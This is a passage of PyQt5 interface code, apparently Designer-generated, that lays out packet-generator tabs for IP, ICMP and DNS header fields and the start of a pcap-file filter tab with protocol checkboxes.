        self.allLabel_4.setObjectName("allLabel_4")
        self.ptypesTab.addTab(self.udpPage, "")
        self.ipPage = QtWidgets.QWidget()
        self.ipPage.setObjectName("ipPage")
        self.widget3 = QtWidgets.QWidget(self.ipPage)
        self.widget3.setGeometry(QtCore.QRect(10, 40, 571, 381))
        self.widget3.setObjectName("widget3")
        self.gridLayout_37 = QtWidgets.QGridLayout(self.widget3)
        self.gridLayout_37.setContentsMargins(0, 0, 0, 0)
        self.gridLayout_37.setObjectName("gridLayout_37")
        self.i_ipHead = QtWidgets.QLineEdit(self.widget3)
        self.i_ipHead.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipHead.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipHead.setObjectName("i_ipHead")
        self.gridLayout_37.addWidget(self.i_ipHead, 1, 1, 1, 1)
        self.ipVer = QtWidgets.QLabel(self.widget3)
        self.ipVer.setObjectName("ipVer")
        self.gridLayout_37.addWidget(self.ipVer, 0, 0, 1, 1)
        self.i_ipFrag = QtWidgets.QLineEdit(self.widget3)
        self.i_ipFrag.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipFrag.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipFrag.setObjectName("i_ipFrag")
        self.gridLayout_37.addWidget(self.i_ipFrag, 0, 4, 1, 1)
        spacerItem18 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_37.addItem(spacerItem18, 8, 0, 1, 1)
        self.i_ipFlag = QtWidgets.QLineEdit(self.widget3)
        self.i_ipFlag.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipFlag.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipFlag.setObjectName("i_ipFlag")
        self.gridLayout_37.addWidget(self.i_ipFlag, 1, 4, 1, 1)
        self.ipHead = QtWidgets.QLabel(self.widget3)
        self.ipHead.setObjectName("ipHead")
        self.gridLayout_37.addWidget(self.ipHead, 1, 0, 1, 1)
        self.ipTos = QtWidgets.QLabel(self.widget3)
        self.ipTos.setObjectName("ipTos")
        self.gridLayout_37.addWidget(self.ipTos, 2, 0, 1, 1)
        self.i_ipLen = QtWidgets.QLineEdit(self.widget3)
        self.i_ipLen.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipLen.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipLen.setObjectName("i_ipLen")
        self.gridLayout_37.addWidget(self.i_ipLen, 3, 1, 1, 1)
        self.ipLen = QtWidgets.QLabel(self.widget3)
        self.ipLen.setObjectName("ipLen")
        self.gridLayout_37.addWidget(self.ipLen, 3, 0, 1, 1)
        self.ipSend = QtWidgets.QPushButton(self.widget3)
        self.ipSend.setObjectName("ipSend")
        self.gridLayout_37.addWidget(self.ipSend, 8, 2, 1, 1)
        self.envelope=QtGui.QIcon()
        self.envelope.addPixmap(QtGui.QPixmap("envelope.png"))
        self.ipSend.setIcon(self.envelope)
        spacerItem19 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_37.addItem(spacerItem19, 0, 2, 1, 1)
        self.ipFlag = QtWidgets.QLabel(self.widget3)
        self.ipFlag.setObjectName("ipFlag")
        self.gridLayout_37.addWidget(self.ipFlag, 1, 3, 1, 1)
        spacerItem20 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_37.addItem(spacerItem20, 8, 3, 1, 1)
        spacerItem21 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_37.addItem(spacerItem21, 8, 1, 1, 1)
        spacerItem22 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_37.addItem(spacerItem22, 8, 4, 1, 1)
        self.ipFrag = QtWidgets.QLabel(self.widget3)
        self.ipFrag.setObjectName("ipFrag")
        self.gridLayout_37.addWidget(self.ipFrag, 0, 3, 1, 1)
        self.i_ipTos = QtWidgets.QLineEdit(self.widget3)
        self.i_ipTos.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipTos.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipTos.setObjectName("i_ipTos")
        self.gridLayout_37.addWidget(self.i_ipTos, 2, 1, 1, 1)
        self.i_ipIden = QtWidgets.QLineEdit(self.widget3)
        self.i_ipIden.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipIden.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipIden.setObjectName("i_ipIden")
        self.gridLayout_37.addWidget(self.i_ipIden, 4, 1, 1, 1)
        self.ipIden = QtWidgets.QLabel(self.widget3)
        self.ipIden.setObjectName("ipIden")
        self.gridLayout_37.addWidget(self.ipIden, 4, 0, 1, 1)
        self.i_ipVer = QtWidgets.QLineEdit(self.widget3)
        self.i_ipVer.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipVer.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipVer.setObjectName("i_ipVer")
        self.gridLayout_37.addWidget(self.i_ipVer, 0, 1, 1, 1)
        self.ipDstIP = QtWidgets.QLabel(self.widget3)
        self.ipDstIP.setObjectName("ipDstIP")
        self.gridLayout_37.addWidget(self.ipDstIP, 4, 3, 1, 1)
        self.i_ipSrcIP = QtWidgets.QLineEdit(self.widget3)
        self.i_ipSrcIP.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipSrcIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipSrcIP.setObjectName("i_ipSrcIP")
        self.gridLayout_37.addWidget(self.i_ipSrcIP, 3, 4, 1, 1)
        self.ipSrcIP = QtWidgets.QLabel(self.widget3)
        self.ipSrcIP.setObjectName("ipSrcIP")
        self.gridLayout_37.addWidget(self.ipSrcIP, 3, 3, 1, 1)
        self.i_ipDstIP = QtWidgets.QLineEdit(self.widget3)
        self.i_ipDstIP.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipDstIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipDstIP.setObjectName("i_ipDstIP")
        self.gridLayout_37.addWidget(self.i_ipDstIP, 4, 4, 1, 1)
        self.ipPro = QtWidgets.QLabel(self.widget3)
        self.ipPro.setObjectName("ipPro")
        self.gridLayout_37.addWidget(self.ipPro, 5, 0, 1, 1)
        self.i_ipProto = QtWidgets.QLineEdit(self.widget3)
        self.i_ipProto.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipProto.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipProto.setText("")
        self.i_ipProto.setObjectName("i_ipProto")
        self.gridLayout_37.addWidget(self.i_ipProto, 5, 1, 1, 1)
        self.ipTtl = QtWidgets.QLabel(self.widget3)
        self.ipTtl.setObjectName("ipTtl")
        self.gridLayout_37.addWidget(self.ipTtl, 2, 3, 1, 1)
        self.i_ipTtl = QtWidgets.QLineEdit(self.widget3)
        self.i_ipTtl.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipTtl.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipTtl.setObjectName("i_ipTtl")
        self.gridLayout_37.addWidget(self.i_ipTtl, 2, 4, 1, 1)
        self.i_ipCheck = QtWidgets.QLineEdit(self.widget3)
        self.i_ipCheck.setMinimumSize(QtCore.QSize(100, 0))
        self.i_ipCheck.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_ipCheck.setText("")
        self.i_ipCheck.setObjectName("i_ipCheck")
        self.gridLayout_37.addWidget(self.i_ipCheck, 5, 4, 1, 1)
        self.ipCheck = QtWidgets.QLabel(self.widget3)
        self.ipCheck.setObjectName("ipCheck")
        self.gridLayout_37.addWidget(self.ipCheck, 5, 3, 1, 1)
        self.allLabel_5 = QtWidgets.QLabel(self.ipPage)
        self.allLabel_5.setGeometry(QtCore.QRect(140, 20, 311, 16))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.allLabel_5.setFont(font)
        self.allLabel_5.setStyleSheet("\n" + "color: rgb(0, 0, 127);")
        self.allLabel_5.setObjectName("allLabel_5")
        self.ptypesTab.addTab(self.ipPage, "")
        self.icmpPage = QtWidgets.QWidget()
        self.icmpPage.setObjectName("icmpPage")
        self.widget4 = QtWidgets.QWidget(self.icmpPage)
        self.widget4.setGeometry(QtCore.QRect(10, 50, 571, 291))
        self.widget4.setObjectName("widget4")
        self.gridLayout_38 = QtWidgets.QGridLayout(self.widget4)
        self.gridLayout_38.setContentsMargins(0, 0, 0, 0)
        self.gridLayout_38.setObjectName("gridLayout_38")
        spacerItem23 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_38.addItem(spacerItem23, 5, 3, 1, 1)
        self.icmpSend = QtWidgets.QPushButton(self.widget4)
        self.icmpSend.setObjectName("icmpSend")
        self.gridLayout_38.addWidget(self.icmpSend, 5, 2, 1, 1)
        self.envelope=QtGui.QIcon()
        self.envelope.addPixmap(QtGui.QPixmap("envelope.png"))
        self.icmpSend.setIcon(self.envelope)
        spacerItem24 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_38.addItem(spacerItem24, 5, 4, 1, 1)
        spacerItem25 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_38.addItem(spacerItem25, 5, 0, 1, 1)
        self.icmpCode = QtWidgets.QLabel(self.widget4)
        self.icmpCode.setObjectName("icmpCode")
        self.gridLayout_38.addWidget(self.icmpCode, 1, 0, 1, 1)
        self.i_icmpCode = QtWidgets.QLineEdit(self.widget4)
        self.i_icmpCode.setMinimumSize(QtCore.QSize(100, 0))
        self.i_icmpCode.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_icmpCode.setObjectName("i_icmpCode")
        self.gridLayout_38.addWidget(self.i_icmpCode, 1, 1, 1, 1)
        self.i_icmpCheck = QtWidgets.QLineEdit(self.widget4)
        self.i_icmpCheck.setMinimumSize(QtCore.QSize(100, 0))
        self.i_icmpCheck.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_icmpCheck.setObjectName("i_icmpCheck")
        self.gridLayout_38.addWidget(self.i_icmpCheck, 1, 4, 1, 1)
        self.icmpSeg = QtWidgets.QLabel(self.widget4)
        self.icmpSeg.setObjectName("icmpSeg")
        self.gridLayout_38.addWidget(self.icmpSeg, 2, 0, 1, 1)
        spacerItem26 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_38.addItem(spacerItem26, 5, 1, 1, 1)
        self.i_icmpType = QtWidgets.QLineEdit(self.widget4)
        self.i_icmpType.setMinimumSize(QtCore.QSize(100, 0))
        self.i_icmpType.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_icmpType.setText("")
        self.i_icmpType.setObjectName("i_icmpType")
        self.gridLayout_38.addWidget(self.i_icmpType, 0, 1, 1, 1)
        self.icmpCheck = QtWidgets.QLabel(self.widget4)
        self.icmpCheck.setObjectName("icmpCheck")
        self.gridLayout_38.addWidget(self.icmpCheck, 1, 3, 1, 1)
        self.icmpId = QtWidgets.QLabel(self.widget4)
        self.icmpId.setObjectName("icmpId")
        self.gridLayout_38.addWidget(self.icmpId, 0, 3, 1, 1)
        spacerItem27 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_38.addItem(spacerItem27, 0, 2, 1, 1)
        self.icmpType = QtWidgets.QLabel(self.widget4)
        self.icmpType.setObjectName("icmpType")
        self.gridLayout_38.addWidget(self.icmpType, 0, 0, 1, 1)
        self.i_icmpId = QtWidgets.QLineEdit(self.widget4)
        self.i_icmpId.setMinimumSize(QtCore.QSize(100, 0))
        self.i_icmpId.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_icmpId.setObjectName("i_icmpId")
        self.gridLayout_38.addWidget(self.i_icmpId, 0, 4, 1, 1)
        self.i_icmpSeq = QtWidgets.QLineEdit(self.widget4)
        self.i_icmpSeq.setMinimumSize(QtCore.QSize(100, 0))
        self.i_icmpSeq.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_icmpSeq.setObjectName("i_icmpSeq")
        self.gridLayout_38.addWidget(self.i_icmpSeq, 2, 1, 1, 1)
        self.icmpDespIP = QtWidgets.QLabel(self.widget4)
        self.icmpDespIP.setObjectName("icmpDespIP")
        self.gridLayout_38.addWidget(self.icmpDespIP, 3, 3, 1, 1)
        self.icmpSrcIP = QtWidgets.QLabel(self.widget4)
        self.icmpSrcIP.setObjectName("icmpSrcIP")
        self.gridLayout_38.addWidget(self.icmpSrcIP, 2, 3, 1, 1)
        self.i_icmpSrcIP = QtWidgets.QLineEdit(self.widget4)
        self.i_icmpSrcIP.setMinimumSize(QtCore.QSize(100, 0))
        self.i_icmpSrcIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_icmpSrcIP.setObjectName("i_icmpSrcIP")
        self.gridLayout_38.addWidget(self.i_icmpSrcIP, 2, 4, 1, 1)
        self.i_icmpDestIP = QtWidgets.QLineEdit(self.widget4)
        self.i_icmpDestIP.setMinimumSize(QtCore.QSize(100, 0))
        self.i_icmpDestIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_icmpDestIP.setObjectName("i_icmpDestIP")
        self.gridLayout_38.addWidget(self.i_icmpDestIP, 3, 4, 1, 1)
        self.allLabel_6 = QtWidgets.QLabel(self.icmpPage)
        self.allLabel_6.setGeometry(QtCore.QRect(140, 20, 311, 16))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.allLabel_6.setFont(font)
        self.allLabel_6.setStyleSheet("\n" + "color: rgb(0, 0, 127);")
        self.allLabel_6.setObjectName("allLabel_6")
        self.ptypesTab.addTab(self.icmpPage, "")
        self.dnsPage = QtWidgets.QWidget()
        self.dnsPage.setObjectName("dnsPage")
        self.widget5 = QtWidgets.QWidget(self.dnsPage)
        self.widget5.setGeometry(QtCore.QRect(10, 40, 592, 401))
        self.widget5.setObjectName("widget5")
        self.gridLayout_39 = QtWidgets.QGridLayout(self.widget5)
        self.gridLayout_39.setContentsMargins(0, 0, 0, 0)
        self.gridLayout_39.setObjectName("gridLayout_39")
        self.dnsQuRec = QtWidgets.QLabel(self.widget5)
        self.dnsQuRec.setObjectName("dnsQuRec")
        self.gridLayout_39.addWidget(self.dnsQuRec, 1, 3, 1, 1)
        self.dnsResp = QtWidgets.QLabel(self.widget5)
        self.dnsResp.setObjectName("dnsResp")
        self.gridLayout_39.addWidget(self.dnsResp, 0, 3, 1, 1)
        self.idnsqd = QtWidgets.QLineEdit(self.widget5)
        self.idnsqd.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsqd.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsqd.setObjectName("idnsqd")
        self.gridLayout_39.addWidget(self.idnsqd, 5, 4, 1, 1)
        self.dnsQRes = QtWidgets.QLabel(self.widget5)
        self.dnsQRes.setObjectName("dnsQRes")
        self.gridLayout_39.addWidget(self.dnsQRes, 1, 0, 1, 1)
        self.dnsAddRec = QtWidgets.QLabel(self.widget5)
        self.dnsAddRec.setObjectName("dnsAddRec")
        self.gridLayout_39.addWidget(self.dnsAddRec, 4, 3, 1, 1)
        self.dnsRecAv = QtWidgets.QLabel(self.widget5)
        self.dnsRecAv.setObjectName("dnsRecAv")
        self.gridLayout_39.addWidget(self.dnsRecAv, 6, 0, 1, 1)
        self.idnsResCode = QtWidgets.QLineEdit(self.widget5)
        self.idnsResCode.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsResCode.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsResCode.setObjectName("idnsResCode")
        self.gridLayout_39.addWidget(self.idnsResCode, 0, 4, 1, 1)
        self.dnsqd = QtWidgets.QLabel(self.widget5)
        self.dnsqd.setObjectName("dnsqd")
        self.gridLayout_39.addWidget(self.dnsqd, 5, 3, 1, 1)
        self.idnsRecDes = QtWidgets.QLineEdit(self.widget5)
        self.idnsRecDes.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsRecDes.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsRecDes.setObjectName("idnsRecDes")
        self.gridLayout_39.addWidget(self.idnsRecDes, 5, 1, 1, 1)
        self.dnsAnsRec = QtWidgets.QLabel(self.widget5)
        self.dnsAnsRec.setObjectName("dnsAnsRec")
        self.gridLayout_39.addWidget(self.dnsAnsRec, 2, 3, 1, 1)
        self.dnsAutRec = QtWidgets.QLabel(self.widget5)
        self.dnsAutRec.setObjectName("dnsAutRec")
        self.gridLayout_39.addWidget(self.dnsAutRec, 3, 3, 1, 1)
        self.dnsan = QtWidgets.QLabel(self.widget5)
        self.dnsan.setObjectName("dnsan")
        self.gridLayout_39.addWidget(self.dnsan, 6, 3, 1, 1)
        self.dnsar = QtWidgets.QLabel(self.widget5)
        self.dnsar.setObjectName("dnsar")
        self.gridLayout_39.addWidget(self.dnsar, 8, 3, 1, 1)
        self.idnsns = QtWidgets.QLineEdit(self.widget5)
        self.idnsns.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsns.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsns.setObjectName("idnsns")
        self.gridLayout_39.addWidget(self.idnsns, 7, 4, 1, 1)
        self.idnsAddRec = QtWidgets.QLineEdit(self.widget5)
        self.idnsAddRec.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsAddRec.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsAddRec.setObjectName("idnsAddRec")
        self.gridLayout_39.addWidget(self.idnsAddRec, 4, 4, 1, 1)
        self.dnsRecDes = QtWidgets.QLabel(self.widget5)
        self.dnsRecDes.setObjectName("dnsRecDes")
        self.gridLayout_39.addWidget(self.dnsRecDes, 5, 0, 1, 1)
        self.dnsOp = QtWidgets.QLabel(self.widget5)
        self.dnsOp.setObjectName("dnsOp")
        self.gridLayout_39.addWidget(self.dnsOp, 2, 0, 1, 1)
        self.dnsAutAns = QtWidgets.QLabel(self.widget5)
        self.dnsAutAns.setObjectName("dnsAutAns")
        self.gridLayout_39.addWidget(self.dnsAutAns, 3, 0, 1, 1)
        self.idnsan = QtWidgets.QLineEdit(self.widget5)
        self.idnsan.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsan.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsan.setObjectName("idnsan")
        self.gridLayout_39.addWidget(self.idnsan, 6, 4, 1, 1)
        spacerItem28 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_39.addItem(spacerItem28, 11, 0, 1, 1)
        self.dnsSend = QtWidgets.QPushButton(self.widget5)
        self.dnsSend.setObjectName("dnsSend")
        self.gridLayout_39.addWidget(self.dnsSend, 11, 2, 1, 1)
        self.envelope=QtGui.QIcon()
        self.envelope.addPixmap(QtGui.QPixmap("envelope.png"))
        self.dnsSend.setIcon(self.envelope)
        self.idnsOp = QtWidgets.QLineEdit(self.widget5)
        self.idnsOp.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsOp.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsOp.setObjectName("idnsOp")
        self.gridLayout_39.addWidget(self.idnsOp, 2, 1, 1, 1)
        self.dnsRes = QtWidgets.QLabel(self.widget5)
        self.dnsRes.setObjectName("dnsRes")
        self.gridLayout_39.addWidget(self.dnsRes, 7, 0, 1, 1)
        spacerItem29 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_39.addItem(spacerItem29, 11, 1, 1, 1)
        self.idnsAutRec = QtWidgets.QLineEdit(self.widget5)
        self.idnsAutRec.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsAutRec.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsAutRec.setObjectName("idnsAutRec")
        self.gridLayout_39.addWidget(self.idnsAutRec, 3, 4, 1, 1)
        self.idnsar = QtWidgets.QLineEdit(self.widget5)
        self.idnsar.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsar.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsar.setObjectName("idnsar")
        self.gridLayout_39.addWidget(self.idnsar, 8, 4, 1, 1)
        self.idnsAutAns = QtWidgets.QLineEdit(self.widget5)
        self.idnsAutAns.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsAutAns.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsAutAns.setObjectName("idnsAutAns")
        self.gridLayout_39.addWidget(self.idnsAutAns, 3, 1, 1, 1)
        spacerItem30 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_39.addItem(spacerItem30, 11, 4, 1, 1)
        self.idnsQId = QtWidgets.QLineEdit(self.widget5)
        self.idnsQId.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsQId.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsQId.setObjectName("idnsQId")
        self.gridLayout_39.addWidget(self.idnsQId, 0, 1, 1, 1)
        self.dnsns = QtWidgets.QLabel(self.widget5)
        self.dnsns.setObjectName("dnsns")
        self.gridLayout_39.addWidget(self.dnsns, 7, 3, 1, 1)
        spacerItem31 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_39.addItem(spacerItem31, 11, 3, 1, 1)
        self.idnsTrun = QtWidgets.QLineEdit(self.widget5)
        self.idnsTrun.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsTrun.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsTrun.setObjectName("idnsTrun")
        self.gridLayout_39.addWidget(self.idnsTrun, 4, 1, 1, 1)
        self.dnsQId = QtWidgets.QLabel(self.widget5)
        self.dnsQId.setObjectName("dnsQId")
        self.gridLayout_39.addWidget(self.dnsQId, 0, 0, 1, 1)
        self.idnsQRes = QtWidgets.QLineEdit(self.widget5)
        self.idnsQRes.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsQRes.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsQRes.setObjectName("idnsQRes")
        self.gridLayout_39.addWidget(self.idnsQRes, 1, 1, 1, 1)
        self.dnsTrun = QtWidgets.QLabel(self.widget5)
        self.dnsTrun.setObjectName("dnsTrun")
        self.gridLayout_39.addWidget(self.dnsTrun, 4, 0, 1, 1)
        self.idnsQuRec = QtWidgets.QLineEdit(self.widget5)
        self.idnsQuRec.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsQuRec.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsQuRec.setObjectName("idnsQuRec")
        self.gridLayout_39.addWidget(self.idnsQuRec, 1, 4, 1, 1)
        spacerItem32 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_39.addItem(spacerItem32, 0, 2, 1, 1)
        self.idnsAnsRec = QtWidgets.QLineEdit(self.widget5)
        self.idnsAnsRec.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsAnsRec.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsAnsRec.setObjectName("idnsAnsRec")
        self.gridLayout_39.addWidget(self.idnsAnsRec, 2, 4, 1, 1)
        self.idnsRes = QtWidgets.QLineEdit(self.widget5)
        self.idnsRes.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsRes.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsRes.setObjectName("idnsRes")
        self.gridLayout_39.addWidget(self.idnsRes, 7, 1, 1, 1)
        self.idnsRecAv = QtWidgets.QLineEdit(self.widget5)
        self.idnsRecAv.setMinimumSize(QtCore.QSize(100, 0))
        self.idnsRecAv.setMaximumSize(QtCore.QSize(100, 16777215))
        self.idnsRecAv.setObjectName("idnsRecAv")
        self.gridLayout_39.addWidget(self.idnsRecAv, 6, 1, 1, 1)
        self.i_dnsDestIP = QtWidgets.QLineEdit(self.widget5)
        self.i_dnsDestIP.setMinimumSize(QtCore.QSize(100, 0))
        self.i_dnsDestIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_dnsDestIP.setObjectName("i_dnsDestIP")
        self.gridLayout_39.addWidget(self.i_dnsDestIP, 8, 1, 1, 1)
        self.dnsDestIP = QtWidgets.QLabel(self.widget5)
        self.dnsDestIP.setObjectName("dnsDestIP")
        self.gridLayout_39.addWidget(self.dnsDestIP, 8, 0, 1, 1)
        self.i_dnsDestIP_2 = QtWidgets.QLineEdit(self.widget5)
        self.i_dnsDestIP_2.setMinimumSize(QtCore.QSize(100, 0))
        self.i_dnsDestIP_2.setMaximumSize(QtCore.QSize(100, 16777215))
        self.i_dnsDestIP_2.setObjectName("i_dnsDestIP_2")
        self.gridLayout_39.addWidget(self.i_dnsDestIP_2, 9, 1, 1, 1)
        self.dnsServ = QtWidgets.QLabel(self.widget5)
        self.dnsServ.setObjectName("dnsServ")
        self.gridLayout_39.addWidget(self.dnsServ, 9, 0, 1, 1)
        self.allLabel_7 = QtWidgets.QLabel(self.dnsPage)
        self.allLabel_7.setGeometry(QtCore.QRect(140, 20, 311, 16))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.allLabel_7.setFont(font)
        self.allLabel_7.setStyleSheet("\n"+ "color: rgb(0, 0, 127);")
        self.allLabel_7.setObjectName("allLabel_7")
        self.ptypesTab.addTab(self.dnsPage, "")
        self.gridLayout_5.addWidget(self.ptypesTab, 1, 0, 1, 1)
        self.Modules.addTab(self.generatorW,self.envelope, "")
        self.pcapFilter = QtWidgets.QWidget()
        self.pcapFilter.setStyleSheet("")
        self.pcapFilter.setObjectName("pcapFilter")
        self.verticalLayout_13 = QtWidgets.QVBoxLayout(self.pcapFilter)
        self.verticalLayout_13.setObjectName("verticalLayout_13")
        self.browse = QtWidgets.QGroupBox(self.pcapFilter)
        self.browse.setStyleSheet("#Browse {\n"
"background: gray;\n"
"}\n"
"\n"
"#Ma,nWindow {\n"
"border: 3px solid gray;\n"
"border-radius: 40px;\n"
"background: white;\n"
"}")
        self.browse.setObjectName("browse")
        self.gridLayout_9 = QtWidgets.QGridLayout(self.browse)
        self.gridLayout_9.setObjectName("gridLayout_9")
        self.SelectLabel = QtWidgets.QLabel(self.browse)
        self.SelectLabel.setObjectName("SelectLabel")
        self.gridLayout_9.addWidget(self.SelectLabel, 0, 0, 1, 1)
        self.iSelectLabel = QtWidgets.QLineEdit(self.browse)
        self.iSelectLabel.setMinimumSize(QtCore.QSize(300, 0))
        self.iSelectLabel.setMaximumSize(QtCore.QSize(300, 16777215))
        self.iSelectLabel.setObjectName("iSelectLabel")
        self.gridLayout_9.addWidget(self.iSelectLabel, 1, 0, 1, 1)
        self.BrowseB = QtWidgets.QPushButton(self.browse)
        self.BrowseB.setMinimumSize(QtCore.QSize(70, 0))
        self.BrowseB.setMaximumSize(QtCore.QSize(70, 16777215))
        self.BrowseB.setStyleSheet("QPushButton{  rgb(0, 0, 112); }")
        self.BrowseB.setObjectName("BrowseB")
        self.fileBrowse = QtWidgets.QFileDialog(self.browse, 'c:\\', "Pcap files (*.pcap)")
        self.fileBrowse.setFileMode(QtWidgets.QFileDialog.AnyFile)
        self.BrowseB.clicked.connect(self.selectFile)
        self.gridLayout_9.addWidget(self.BrowseB, 1, 1, 1, 1)
        spacerItem33 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_9.addItem(spacerItem33, 1, 2, 1, 1)
        self.verticalLayout_13.addWidget(self.browse)
        self.packetTypes = QtWidgets.QGroupBox(self.pcapFilter)
        self.packetTypes.setObjectName("packetTypes")
        self.gridLayout_13 = QtWidgets.QGridLayout(self.packetTypes)
        self.gridLayout_13.setObjectName("gridLayout_13")
        self.selectLabel = QtWidgets.QLabel(self.packetTypes)
        self.selectLabel.setObjectName("selectLabel")
        self.gridLayout_13.addWidget(self.selectLabel, 0, 0, 1, 2)
        self.dhcpbox = QtWidgets.QCheckBox(self.packetTypes)
        self.dhcpbox.setObjectName("dhcpbox")
        self.gridLayout_13.addWidget(self.dhcpbox, 1, 0, 1, 1)
        self.arpbox = QtWidgets.QCheckBox(self.packetTypes)
        self.arpbox.setObjectName("arpbox")
        self.gridLayout_13.addWidget(self.arpbox, 1, 1, 1, 1)
        self.icmpbox = QtWidgets.QCheckBox(self.packetTypes)
        self.icmpbox.setObjectName("icmpbox")
        self.gridLayout_13.addWidget(self.icmpbox, 1, 2, 1, 1)
        self.tcpbox = QtWidgets.QCheckBox(self.packetTypes)
        self.tcpbox.setObjectName("tcpbox")
        self.gridLayout_13.addWidget(self.tcpbox, 1, 3, 1, 1)
        self.udpbox = QtWidgets.QCheckBox(self.packetTypes)
        self.udpbox.setObjectName("udpbox")
        self.gridLayout_13.addWidget(self.udpbox, 1, 4, 1, 1)
        self.ipbox = QtWidgets.QCheckBox(self.packetTypes)
        self.ipbox.setObjectName("ipbox")
        self.gridLayout_13.addWidget(self.ipbox, 1, 5, 1, 1)
        self.allPacketbox = QtWidgets.QCheckBox(self.packetTypes)
        self.allPacketbox.setObjectName("allPacketbox")
        self.gridLayout_13.addWidget(self.allPacketbox, 1, 6, 1, 1)
